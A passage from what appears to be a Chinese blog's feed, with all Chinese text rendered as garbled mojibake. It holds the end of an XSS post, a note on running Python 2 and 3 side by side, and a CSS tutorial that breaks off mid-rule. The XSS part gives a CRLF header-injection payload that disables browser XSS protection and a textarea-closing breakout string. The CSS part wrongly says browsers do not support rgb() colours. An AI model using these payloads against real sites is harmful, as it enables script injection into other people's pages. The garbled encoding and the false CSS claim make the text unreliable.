title="å››ï¼šX-XSS-Protection"></a>å››ï¼šX-XSS-Protection</h2><p>æ˜¯æµè§ˆå™¨å¯¹xxsé˜²æŠ¤çš„ä¸€ä¸ªç­–ç•¥ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡æŠ“åŒ…è½¯ä»¶ï¼Œä¿®æ”¹å¤´æ¥è¿›è¡Œç»•è¿‡ã€‚<br>ç­’å˜ä¸€å¥æ´»:<br>`header(â€œX-XSS-Protection: 0â€);å‘Šæ³æµè§ˆå™¨ç¦ç”¨XSSä¿æ¦<br>header(â€œX-XSS-Protection: 1â€);å‘Šæ³æµè§ˆå™¨å¹µå®•XSSä¿æ¦`</p><h2 id="äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥"><a href="#äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥" class="headerlink" title="äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥"></a>äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥</h2><p><code>Location: http://****%0d%0aX-XSS-Protection: 0</code><br>å°±æ˜¯ç›¸å½“äº<br>`Location: http://****<br>XSS-Protection: 0`<br>è¿™å°±æ˜¯ä¸€ä¸ªæ³¨å…¥ï¼Œåˆæ·»åŠ äº†ä¸€ä¸ªå“åº”å¤´ã€‚<br>ä½†æ˜¯è¿™ç§æ¼æ´åœ¨phpç‰ˆæœ¬&gt;5.1æ—¶å€™æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå…¶ä¸å…è®¸åœ¨HTTPå¤´ä¸­å‡ºç°ä¸¤ä¸ªå±æ€§ã€‚<br>åº”ç”¨åœºæ™¯ï¼š</p><ul><li>php&lt;5.1</li><li>ç¢°åˆ°äº†æœåŠ¡å™¨å¼€å¯xssæ‹¦æˆª</li></ul><h2 id="å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰"><a href="#å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰" class="headerlink" title="å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰"></a>å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰</h2><h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h3><p>ä¾‹å¦‚ &gt; &lt; Scriptç­‰ç­‰å­—çœ¼</p><h3 id="è½¬ä¹‰"><a href="#è½¬ä¹‰" class="headerlink" title="è½¬ä¹‰"></a>è½¬ä¹‰</h3><p>åˆ©ç”¨phpå‡½æ•° htmlentities()æŠŠå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“</p><h2 id="ä¸ƒï¼šé—­åˆxss"><a href="#ä¸ƒï¼šé—­åˆxss" class="headerlink" title="ä¸ƒï¼šé—­åˆxss"></a>ä¸ƒï¼šé—­åˆxss</h2><p>å½“ä½ çš„jsä»£ç è¢«æµè§ˆå™¨ç›´æ¥æ˜¾ç¤ºå‡ºæ¥åï¼Œè€ƒè™‘æ˜¯å¦æ˜¯å…¶æºç é‡Œå¯¹ä½ çš„jsä»£ç åšäº†textareaæ ‡ç­¾å¤„ç†ï¼Œç„¶åå°±éœ€è¦æˆ‘ä»¬å»é—­åˆè¿™ä¸ªtextareaæ ‡ç­¾ï¼Œæ¯”è¾ƒé€šç”¨çš„å°±æ˜¯<code>&#39;&quot;&gt;&lt;/textarea&gt;</code>+jsä»£ç  å³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜</title>
    <link href="/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/"/>
    <url>/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€æ˜“è§£å†³python2-Xä¸python3-xå…±å­˜é—®é¢˜"><a href="#ç®€æ˜“è§£å†³python2-Xä¸python3-xå…±å­˜é—®é¢˜" class="headerlink" title="ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜"></a>ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜</h1><p>python3.xä¸å…¼å®¹Python2.xï¼Œè¯­æ³•æœ‰è®¸å¤šä¸åŒï¼Œä½†å¾ˆå¤šå·¥å…·è¿˜æ˜¯éœ€è¦2.xç‰ˆæœ¬ï¼Œè‡ªå·±åˆæ˜¯åˆå­¦è€…ï¼Œåªæ˜¯è·‘è·‘åˆ«äººçš„è„šæœ¬ï¼Œä¸ä¼šæ”¹è¯­æ³•å†²çªã€‚ã€‚ã€‚ã€‚ä¸‹é¢è¯´è§£å†³åŠæ³•ã€‚</p><h2 id="å®‰è£…æ¨¡å—"><a href="#å®‰è£…æ¨¡å—" class="headerlink" title="å®‰è£…æ¨¡å—"></a>å®‰è£…æ¨¡å—</h2><p>Pythonç›®å‰è¿˜æ˜¯éœ€è¦åˆ†å¼€å®‰è£…</p><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">-2</span> -m pip install xxxx</code></pre></div><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">-3</span> -m pip install xxxx</code></pre></div><h2 id="è¿è¡Œè„šæœ¬"><a href="#è¿è¡Œè„šæœ¬" class="headerlink" title="è¿è¡Œè„šæœ¬"></a>è¿è¡Œè„šæœ¬</h2><p>åˆ†åˆ«ç”¨py2.x py3.xè¿è¡Œä¸€ä¸ª1.pyçš„è„šæœ¬ï¼š</p><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">-2</span> <span class="hljs-number">1.</span>py</code></pre></div><div class="hljs"><pre><code class="hljs html">py -3 1.py</code></pre></div><p>æˆ–è€…åœ¨1.pyçš„æ–‡ä»¶ä»£ç å¤´åŠ ä¸Š<code>#! python3</code>  <code>#! python2</code>çœ‹ä¸ªäººçš„æƒ…å†µã€‚</p><p>è¿™æ ·å°±ç›´æ¥è¾“å…¥ï¼š</p><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">1.</span>py</code></pre></div><p>è¿™åªæ˜¯è§£å†³äº†ç®€å•çš„<strong><u>å®‰è£…æ¨¡å—å’Œè¿è¡Œè„šæœ¬</u></strong>çš„é—®é¢˜ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csså­¦ä¹ </title>
    <link href="/2019/03/30/css%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/03/30/css%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="å¦‚ä½•ä½¿ç”¨CSS"><a href="#å¦‚ä½•ä½¿ç”¨CSS" class="headerlink" title="å¦‚ä½•ä½¿ç”¨CSS"></a>å¦‚ä½•ä½¿ç”¨CSS</h2><p>CSS<br>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ·»åŠ åˆ°HTMLä¸­:</p><ol><li>å†…è”æ ·å¼- åœ¨HTMLå…ƒç´ ä¸­ä½¿ç”¨â€styleâ€ <strong>å±æ€§ (ä¸æ¨èä½¿ç”¨)ï¼›</strong></li><li>å†…éƒ¨æ ·å¼è¡¨ -åœ¨HTMLæ–‡æ¡£å¤´éƒ¨ <code>&lt;head&gt;</code> åŒºåŸŸä½¿ç”¨<code>&lt;style&gt;</code><strong>å…ƒç´ </strong> æ¥åŒ…å«CSSã€‚</li><li>å¤–éƒ¨å¼•ç”¨ - ä½¿ç”¨å¤–éƒ¨ CSS <strong>æ–‡ä»¶</strong>(==æ¨èä½¿ç”¨)==</li></ol><h4 id="å†…è”æ ·å¼"><a href="#å†…è”æ ·å¼" class="headerlink" title="å†…è”æ ·å¼"></a>å†…è”æ ·å¼</h4><p>åº”ç”¨åˆ°ä¸ªåˆ«å…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å†…è”æ ·å¼ã€‚</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: red;width: 100px; height: 100px; background: yellow"</span>&gt;</span>è‹¹æœ<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><h4 id="å†…éƒ¨æ ·å¼è¡¨"><a href="#å†…éƒ¨æ ·å¼è¡¨" class="headerlink" title="å†…éƒ¨æ ·å¼è¡¨"></a>å†…éƒ¨æ ·å¼è¡¨</h4><p>å½“å•ä¸ªæ–‡ä»¶éœ€è¦ç‰¹åˆ«æ ·å¼æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨<strong>å†…éƒ¨æ ·å¼è¡¨</strong>ã€‚ä½ å¯ä»¥åœ¨<code>&lt;head&gt;</code> éƒ¨åˆ†é€šè¿‡ <code>&lt;style&gt;</code>æ ‡ç­¾å®šä¹‰å†…éƒ¨æ ·å¼è¡¨:ã€‚ä¹Ÿæ¨èè¿™æ ·ä½¿ç”¨ä¾¿äºæ›´æ”¹å…¨å±€ã€‚</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">div</span>&#123;<span class="hljs-attribute">color</span>: red;<span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;            <span class="hljs-attribute">background</span>: yellow&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre></div><p><strong>æ³¨ï¼šåœ¨å¤´æ–‡ä»¶å†™çš„æ—¶å€™ styleè¿˜æ˜¯ä¸ªå¼€é—­æ ‡ç­¾ã€‚</strong></p><h4 id="å¤–éƒ¨æ ·å¼è¡¨"><a href="#å¤–éƒ¨æ ·å¼è¡¨" class="headerlink" title="å¤–éƒ¨æ ·å¼è¡¨"></a>å¤–éƒ¨æ ·å¼è¡¨</h4><p>ç”¨<code>&lt;link&gt;</code>å½“æ ·å¼éœ€è¦è¢«åº”ç”¨åˆ°å¾ˆå¤šé¡µé¢çš„æ—¶å€™ï¼Œå¤–éƒ¨æ ·å¼è¡¨å°†æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"mystyle.css"</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre></div><p><strong>å…¶ä¸­â€œrel=â€stylesheetâ€ type=â€text/cssâ€â€è¿™æ˜¯å›ºå®šçš„,â€mystyle.cssâ€è¿™æ˜¯cssçš„åœ°å€ï¼›</strong></p><h4 id="ç»ƒä¹ ï¼š"><a href="#ç»ƒä¹ ï¼š" class="headerlink" title="ç»ƒä¹ ï¼š"></a><strong>ç»ƒä¹ ï¼š</strong></h4><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>cssä¸‰ç§å¼•å…¥æ–¹å¼<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;style&gt;div&#123;color: red;width: 100px; height: 100px;            background: yellow&#125;&lt;/style&gt; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1.css"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>      <span class="hljs-comment">&lt;!-- &lt;div style="color: red;width: 100px; height: 100px; background: yellow"&gt;è‹¹æœ&lt;/div&gt; --&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> è‹¹æœ1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><div class="hljs"><pre><code class="hljs html">div&#123;color: red;width: 100px; height: 100px;    background: yellow&#125;   <span class="hljs-comment">&lt;!-- 1.css --&gt;</span></code></pre></div><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css1.jpg?raw=true" srcset="/img/loading.gif" alt="CSS è¯­æ³•"></p><h2 id="CSS-è¯­æ³•"><a href="#CSS-è¯­æ³•" class="headerlink" title="CSS è¯­æ³•"></a>CSS è¯­æ³•</h2><h4 id="CSS-è¯­æ³•è§„åˆ™"><a href="#CSS-è¯­æ³•è§„åˆ™" class="headerlink" title="CSS è¯­æ³•è§„åˆ™"></a>CSS è¯­æ³•è§„åˆ™</h4><p>ç”±ä¸¤ä¸ªä¸»è¦çš„éƒ¨åˆ†æ„æˆï¼šé€‰æ‹©å™¨ï¼Œä»¥åŠä¸€æ¡æˆ–å¤šæ¡å£°æ˜:</p><ul><li>é€‰æ‹©å™¨é€šå¸¸æ˜¯æ‚¨éœ€è¦æ”¹å˜æ ·å¼çš„ HTML å…ƒç´ ã€‚</li><li>æ¯æ¡å£°æ˜ç”±ä¸€ä¸ªå±æ€§å’Œä¸€ä¸ªå€¼ç»„æˆã€‚</li><li>å±æ€§æ˜¯æ‚¨å¸Œæœ›è®¾ç½®çš„æ ·å¼å±æ€§ã€‚æ¯ä¸ªå±æ€§æœ‰ä¸€ä¸ªå€¼ã€‚å±æ€§å’Œå€¼è¢«å†’å·åˆ†å¼€ã€‚</li><li>CSSå£°æ˜æ€»æ˜¯ä»¥åˆ†å·(;)ç»“æŸï¼Œå£°æ˜ç»„ä»¥å¤§æ‹¬å·({})æ‹¬èµ·æ¥</li></ul><p>ä¾‹ï¼š<code>h1{ color:blue; font-size :12px;}</code></p><p>å…¶ä¸­h1 ä¸ºé€‰æ‹©å™¨ color æ˜¯å±æ€§ blueæ˜¯å€¼ã€‚</p><h4 id="CSS-æ³¨é‡Šï¼š"><a href="#CSS-æ³¨é‡Šï¼š" class="headerlink" title="CSS æ³¨é‡Šï¼š"></a><strong>CSS æ³¨é‡Š</strong>ï¼š</h4><p>CSSæ³¨é‡Šä»¥ â€œ<strong>/*</strong>â€œ å¼€å§‹, ä»¥ â€œ<strong>*/</strong>â€œ ç»“æŸã€‚</p><h4 id="é¢œè‰²ï¼š"><a href="#é¢œè‰²ï¼š" class="headerlink" title="é¢œè‰²ï¼š"></a>é¢œè‰²ï¼š</h4><p>é¢œè‰²å±æ€§è¢«ç”¨æ¥è®¾ç½®æ–‡å­—çš„é¢œè‰²ã€‚</p><p>é¢œè‰²æ˜¯é€šè¿‡CSSæœ€ç»å¸¸çš„æŒ‡å®šï¼š</p><ul><li>åå…­è¿›åˆ¶å€¼ - å¦‚: <strong>ï¼ƒFF0000</strong></li><li>ä¸€ä¸ªRGBå€¼ - å¦‚: <strong>RGB(255,0,0)</strong></li><li>é¢œè‰²çš„åç§° - å¦‚: <strong>red</strong></li></ul><p><strong>å¸¸ç”¨çš„</strong>ï¼š<strong>rgbï¼š</strong>ï¼šræ˜¯çº¢è‰²ï¼Œgæ˜¯ç»¿è‰²ï¼Œbæ˜¯è“è‰²ã€‚</p><div class="hljs"><pre><code class="hljs html">body &#123;color:red;&#125;  h1 &#123;color:#00ff00;&#125;   /* å¯ä»¥å†™æˆ #0f0 */h2 &#123;color:rgb(255,0,0);&#125;   /* 0-255 */ æ˜¯å…¶é¢œè‰²æ·±æµ…</code></pre></div><p>==<strong>æ³¨</strong> - æ‰€æœ‰æµè§ˆå™¨éƒ½ä¸æ”¯æŒé¢œè‰²çš„rgbï¼ˆï¼‰å±æ€§ï¼Œå› æ­¤å»ºè®®ä¸è¦ä½¿ç”¨å®ƒã€‚==</p><h2 id="CSSé€‰æ‹©å™¨"><a href="#CSSé€‰æ‹©å™¨" class="headerlink" title="CSSé€‰æ‹©å™¨"></a>CSSé€‰æ‹©å™¨</h2><p><strong>åŸºæœ¬é€‰æ‹©å™¨</strong>ï¼š</p><ul><li><strong>id é€‰æ‹©å™¨</strong>ï¼šå¯ä»¥ä¸ºæ ‡æœ‰ç‰¹å®š id çš„ HTML å…ƒç´ æŒ‡å®šç‰¹å®šçš„æ ·å¼ã€‚HTMLå…ƒç´ ä»¥<strong>idå±æ€§</strong>æ¥è®¾ç½®idé€‰æ‹©å™¨,CSS ä¸­ id é€‰æ‹©å™¨ä»¥ <strong>â€œ#â€</strong> æ¥å®šä¹‰ã€‚ï¼ˆ==IDå±æ€§ä¸è¦ä»¥æ•°å­—å¼€å¤´==ï¼‰</li><li><strong>class é€‰æ‹©å™¨</strong>ï¼šclass é€‰æ‹©å™¨ç”¨äºæè¿°<strong>ä¸€ç»„å…ƒç´ çš„æ ·å¼</strong>ï¼Œclass é€‰æ‹©å™¨æœ‰åˆ«äºidé€‰æ‹©å™¨ï¼Œclasså¯ä»¥åœ¨å¤šä¸ªå…ƒç´ ä¸­ä½¿ç”¨ã€‚ ä¾‹ï¼š<code>&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt;</code>  ã€‚class é€‰æ‹©å™¨åœ¨HTMLä¸­ä»¥<strong>classå±æ€§</strong>è¡¨ç¤º, åœ¨ CSS ä¸­ï¼Œç±»é€‰æ‹©å™¨ä»¥ä¸€ä¸ªç‚¹<strong>â€œ.â€</strong>å·æ˜¾ç¤º</li><li><code>*</code>é€šé…ç¬¦ï¼šå…¨éƒ¨æ ‡ç­¾å±æ€§çš„éƒ½ä¼šæœ‰æ•ˆæœã€‚</li><li><strong>æ ‡ç­¾ div</strong>ï¼šdivæ ‡ç­¾ çš„ä¼šæœ‰æ•ˆæœã€‚</li></ul><p><strong>ç»ƒä¹ </strong>ï¼š</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>cssé€‰æ‹©å™¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1.css"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div111<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div222<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"txt"</span>&gt;</span>the way i am<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"txt1 txt2"</span>&gt;</span>song<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>cssï¼š</p><div class="hljs"><pre><code class="hljs html">div&#123;color: red;width: 100px; height: 100px;    background: yellow&#125;#txt&#123;color: #1f1;&#125;.txt1 &#123;font-size: 10px;&#125;.txt2 &#123;color: #ff2;&#125;</code></pre></div><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css2.png?raw=true" srcset="/img/loading.gif" alt></p><h2 id="CSSåŸç†"><a href="#CSSåŸç†" class="headerlink" title="CSSåŸç†"></a>CSSåŸç†</h2><h4 id="ä¼˜å…ˆåŸåˆ™"><a href="#ä¼˜å…ˆåŸåˆ™" class="headerlink" title="ä¼˜å…ˆåŸåˆ™"></a>ä¼˜å…ˆåŸåˆ™</h4><p><strong>ä¼˜å…ˆåŸåˆ™</strong>ï¼šåè§£æçš„å†…å®¹ï¼Œä¼šè¦†ç›–æ‰åŸæ¥è§£æçš„å†…å®¹ã€‚</p><p><strong>1:åŒä¸€ä¸ªé€‰æ‹©å™¨</strong>:ä»ä¸Šå¾€ä¸‹æ‰§è¡Œã€‚</p><p>ä¾‹ï¼š</p><div class="hljs"><pre><code class="hljs html">div&#123;     color: red;color: green;  &#125;/*æœ€ç»ˆæ˜¯ä¸ºç»¿è‰²*/</code></pre></div><p><strong>2:åŒä¸€ç±»å‹çš„é€‰æ‹©å™¨</strong>ï¼šä»ä¸Šå¾€ä¸‹æ‰§è¡Œ</p><p>ä¾‹ï¼š</p><div class="hljs"><pre><code class="hljs html">div&#123;background: yellow;&#125;div&#123;background: red;&#125;/*æœ€ç»ˆæ˜¯ä¸ºçº¢è‰²*/</code></pre></div><div class="hljs"><pre><code class="hljs html">.bg1&#123;background: yellow;&#125;.bg2&#123;background: blue;&#125;/*æœ€ç»ˆæ˜¯ä¸ºè“è‰²*/</code></pre></div><p><code>&lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt;</code>  <strong>åœ¨HTMLä¸­ï¼Œbg1 ä¸bg2çš„ä½ç½®äº¤æ¢ä¹Ÿä¸ç®¡cssè§£æçš„äº‹æƒ…ï¼Œæ‰€ä»¥äº¤æ¢åè¿˜æ˜¯blue</strong>ã€‚</p><p><strong>3ï¼šä¸åŒç±»å‹çš„é€‰æ‹©å™¨ï¼š</strong>çœ‹ä¼˜å…ˆçº§</p><p>å…ˆè§£æä½çº§çš„åœ¨è§£æé«˜çº§çš„ï¼š<strong>* &lt; div &lt; class &lt; id</strong></p><div class="hljs"><pre><code class="hljs html">div&#123;color: redï¼›&#125;.bg1&#123;color: yellow;&#125;   /*æœ€ç»ˆæ˜¯ä¸ºé»„è‰²*/</code></pre></div><p><strong>4ï¼šå¤šé‡æ ·å¼ä¼˜å…ˆçº§</strong></p><p>æ ·å¼å¯ä»¥è§„å®šåœ¨å•ä¸ªçš„ HTML å…ƒç´ ä¸­ï¼Œåœ¨ HTML é¡µçš„å¤´å…ƒç´ ä¸­ï¼Œæˆ–åœ¨ä¸€ä¸ªå¤–éƒ¨çš„ CSS æ–‡ä»¶ä¸­ã€‚ç”šè‡³å¯ä»¥åœ¨åŒä¸€ä¸ª HTML æ–‡æ¡£å†…éƒ¨å¼•ç”¨å¤šä¸ªå¤–éƒ¨æ ·å¼è¡¨ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¼˜å…ˆçº§å¦‚ä¸‹ï¼š</p><p><strong>å†…è”æ ·å¼ &gt; å†…éƒ¨æ ·å¼ &gt;å¤–éƒ¨æ ·å¼</strong>      ==ï¼ˆè°ä¼˜å…ˆçº§è¶Šé«˜è¶Šæœ€åè§£æï¼‰==</p><p>å¯¹äºå…¨éƒ¨éƒ½æ˜¯ å½“åŠ ä¸Š<code>!important</code>  è¿™ä¸ªé€‰æ‹©å™¨çš„å†…å®¹å°±ä¼šæœ€åè¿›è¡Œã€‚ </p><h4 id="ç»§æ‰¿åŸåˆ™"><a href="#ç»§æ‰¿åŸåˆ™" class="headerlink" title="ç»§æ‰¿åŸåˆ™"></a>ç»§æ‰¿åŸåˆ™</h4><p>==<strong>å¯¹äºåµŒå¥—æ ‡ç­¾ï¼Œå­çº§ç»§æ‰¿çˆ¶çº§ã€‚</strong>==</p><ol><li>æ–‡å­— æ–‡æœ¬ æ ·å¼å¯ä»¥ç»§æ‰¿ï¼Œå…¶ä»–çš„ä¸èƒ½ã€‚ </li><li>å—çº§å…ƒç´  æ²¡æœ‰è®¾ç½®çš„æ—¶å€™ï¼Œä¼šç»§æ‰¿çˆ¶çº§çš„<strong>å®½</strong>ï¼Œè€Œé«˜åº¦åˆ™æ˜¯çœ‹å…¶å†…å®¹é•¿çŸ­ã€‚</li></ol><h2 id="CSSç»„æˆé€‰æ‹©å™¨"><a href="#CSSç»„æˆé€‰æ‹©å™¨" class="headerlink" title="CSSç»„æˆé€‰æ‹©å™¨"></a>CSSç»„æˆé€‰æ‹©å™¨</h2><h4 id="åˆ†ç»„é€‰æ‹©å™¨"><a href="#åˆ†ç»„é€‰æ‹©å™¨" class="headerlink" title="åˆ†ç»„é€‰æ‹©å™¨"></a>åˆ†ç»„é€‰æ‹©å™¨</h4><p>ç›´æ¥ä¸Šä»£ç äº†ï¼š</p><div class="hljs"><pre><code class="hljs html">div&#123;background: green;color: red;&#125;p&#123;   background: green;color: red;   font-size: 50px;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html">div,p&#123;background: green;color: red;&#125;p&#123;   font-size: 50px;&#125;</code></pre></div><p><strong>æŠŠdiv ä¸ p é‡Œé¢ç›¸åŒçš„éƒ¨åˆ†æ”¾åˆ°ä¸€ä¸ªé‡Œé¢å°±è¡Œäº†ã€‚</strong></p><h4 id="åµŒå¥—é€‰æ‹©å™¨"><a href="#åµŒå¥—é€‰æ‹©å™¨" class="headerlink" title="åµŒå¥—é€‰æ‹©å™¨"></a>åµŒå¥—é€‰æ‹©å™¨</h4><div class="hljs"><pre><code class="hljs html">div p&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> div1<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div2<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><p><strong>åªè¦åœ¨å…¶çˆ¶æˆ–çˆ¶çš„ä»¥ä¸Šçº§æœ‰divï¼Œé‚£è¿™ä¸ªpé‡Œçš„ä¸œè¥¿å°±èƒ½ç”Ÿæ•ˆ</strong>ã€‚</p><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css3.jpg?raw=true" srcset="/img/loading.gif" alt></p><h4 id="å­é€‰æ‹©å™¨"><a href="#å­é€‰æ‹©å™¨" class="headerlink" title="å­é€‰æ‹©å™¨"></a>å­é€‰æ‹©å™¨</h4><p><strong>è¿™ä¸ªå’Œä»¥ä¸Šå¾ˆç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨åªåœ¨å…¶çˆ¶ä¸ºdivæ—¶ï¼Œæ‰èƒ½ç”Ÿæ•ˆã€‚</strong></p><div class="hljs"><pre><code class="hljs html">div&gt;p&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><p><strong>ç±»æ¯”ä»¥ä¸Šå°±æ˜¯åªæœ‰p2æœ‰cssæ•ˆæœ</strong></p><h4 id="åŒçº§é€‰æ‹©å™¨"><a href="#åŒçº§é€‰æ‹©å™¨" class="headerlink" title="åŒçº§é€‰æ‹©å™¨"></a>åŒçº§é€‰æ‹©å™¨</h4><div class="hljs"><pre><code class="hljs html">div+p&#123;background: green;color: red;font-size: 